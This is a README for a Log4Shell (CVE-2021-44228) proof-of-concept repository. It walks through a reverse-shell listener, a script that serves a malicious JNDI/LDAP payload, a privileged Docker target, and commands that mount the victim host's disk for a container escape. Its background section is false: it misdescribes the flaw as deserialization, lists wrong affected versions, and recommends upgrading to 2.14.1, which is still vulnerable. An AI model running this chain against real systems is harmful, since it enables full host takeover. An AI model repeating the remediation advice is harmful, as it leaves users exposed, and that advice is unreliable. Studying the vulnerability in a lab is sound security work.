Log4j Vulnerability (CVE-2021-44228)
----------------------

A security vulnerability, identified as CVE-2021-44228, has been discovered in certain versions of the Log4j library. In this proof of concept (poc) the explotetion of the log4j vulnerability is combined with another misconfiguration which allow an attacker to gain complete control of a victim host.

The vulnerability is caused by a flaw in the way Log4j handles deserialization of untrusted data. An attacker could exploit this vulnerability by injecting malicious payloads into the log data, which would then be deserialized by Log4j. If the victim host has a vulnerable version of Log4j and a misconfigured Java Object Input Stream (OIS) deserialization, the attacker could potentially execute arbitrary code with the same privileges as the user running the application.
In this example, multiple exploits are used in succession. First, the log4j vulnerability is exploited, and then a misconfiguration in the privileged mode of the Docker service is exploited in order to gain access to the host system.

Affected versions of Log4j are:
2.13.3 and prior
2.14.0
It is highly recommended to upgrade to Log4j version 2.14.1 or later, which addresses this vulnerability.

In addition to upgrading Log4j, it is important to ensure that the OIS deserialization is properly configured to only deserialize trusted data. This can be done by implementing a custom ObjectInputStream subclass that checks for malicious payloads or by disabling deserialization altogether if it is not needed for the application.

Please also review your system and verify that you are not using any vulnerable version of log4j and also check the deserialization configuration of your application.

It is important to keep your software up to date, and to be aware of any security vulnerabilities that may affect your systems. If you suspect that your host may have been compromised, it is important to take immediate action to contain the damage and prevent further attacks.

----------------------

As a PoC, a python file that automates the process is been created. 


#### Requirements:
```bash
pip install -r requirements.txt
```

#### Usage (exploiting log4j vuln):

* Start a pwncat listener to accept reverse shell connection.<br>
```py
pyhton3 -m pwncat -lp 4545 -m linux
```

* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
```py
$ python3 poc.py --userip localhost --webport 9000 --lport 4545

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/stefanosimonetto/log4j-shell-poc.git
[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>


Dockerized vulnerable application
--------------------------

A Dockerfile is been added with the vulnerable webapp. You can use this by following the steps below:
```c
1: docker build -t log4j-shell-poc .
2: docker run --priviliged --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.

<br>

#### Usage (exploiting Docker misconfiguration):
Once you have remote code execution enable:

```py
press CTRL+D to change from local to remote
```
Execute the following commands to make a directory and copy the victim's host disk:
```py
mkdir -p /mnt/pwned
mount /dev/sda1 /mnt/pwned
```


Getting the Java version.
--------------------------------------

At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Using this exploit for malicious activity is not endorsed or supported. If assistance is requested, proof of ownership or authorized penetration testing permission for the target service may be required.

